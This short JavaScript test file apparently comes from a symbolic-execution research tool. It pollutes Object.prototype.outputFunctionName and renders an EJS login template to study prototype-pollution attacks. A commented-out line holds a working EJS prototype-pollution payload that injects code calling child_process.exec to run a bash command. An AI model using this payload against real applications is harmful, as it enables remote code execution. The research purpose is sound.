const ejs = require('ejs')

var S$ = require('../../../lib/S$')
Object.prototype.outputFunctionName = S$.pureSymbol('outputFunctionName_undef')


// Object.prototype.outputFunctionName = "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"


var result = ejs.renderFile('/home/ubuntu/PPAEG/ExpoSE+/tests/template_engines/ejs/views/login_register.ejs', {
    title:" storeHtml | logins ",
    buttonHintF:"登 录",
    buttonHintS:"没有账号?",
    hint:"登录",
    next:"/register"
})